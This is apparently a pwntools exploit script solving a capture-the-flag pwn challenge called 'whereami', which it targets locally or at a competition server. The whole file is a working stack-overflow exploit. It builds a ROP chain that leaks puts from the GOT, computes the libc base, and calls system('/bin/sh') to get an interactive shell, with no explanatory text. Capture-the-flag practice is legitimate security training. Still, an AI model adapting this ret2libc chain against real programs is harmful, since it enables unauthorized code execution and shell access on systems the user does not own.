from pwn import *
elf = ELF("whereami")
libc = ELF("libc.so.6")
context.log_level = "debug"

ip,port = "challs.actf.co", 31222

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()


pop_rdi = p64(0x0000000000401303)
ret = p64(0x000000000040101a)
bss = p64(0x40406c)
puts_plt = elf.plt["puts"]
gets = elf.plt["gets"]
got_puts = elf.got["puts"]
main = elf.symbols["main"]
payload1 = b"A"*72 + pop_rdi + p64(got_puts) + p64(puts_plt) + pop_rdi + bss + p64(gets) + ret + p64(main)
sla("you?",payload1)
sl(b"\x00")

rl()
puts_offset = int(libc.symbols["puts"])
libc.address = int(unpack(r.recv(6),48)) - puts_offset
print(hex(libc.address))
r.recv()

binsh = int(next(libc.search(b'/bin/sh')))
system = int(libc.symbols["system"])
print(hex(binsh))

payload = b"A"*72 + pop_rdi + p64(binsh) + ret + p64(system)
sla("you?",payload)

r.interactive()